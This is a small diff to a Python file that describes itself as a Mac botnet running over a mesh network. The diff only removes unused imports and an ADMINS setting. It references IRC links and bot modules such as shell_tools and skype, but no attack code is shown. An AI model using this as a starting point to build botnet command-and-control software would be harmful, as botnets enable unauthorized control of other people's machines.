@@ -1,8 +1,5 @@
 """Mac botnet based on github.com/pirate/python-medusa which runs on the mesh platform"""
 
-import json
-import requests
-import signal
 import sys
 import time
 
@@ -12,7 +9,7 @@ sys.path.append("..")
 from node import Node
 from links import IRCLink, UDPLink
 from programs import RoutedProgram, R
-from protocols import MeshIP, MeshARP
+from protocols import MeshIP
 
 # Bot Modules
 import skype
@@ -21,7 +18,7 @@ import shell_tools
 import identification
 import communication
 
-from settings import IRC_CONNECTIONS, NICK, VERSION, MAIN_USER, ADMINS
+from settings import IRC_CONNECTIONS, NICK, VERSION, MAIN_USER
 
 """
 Programs for network communication, discovery,
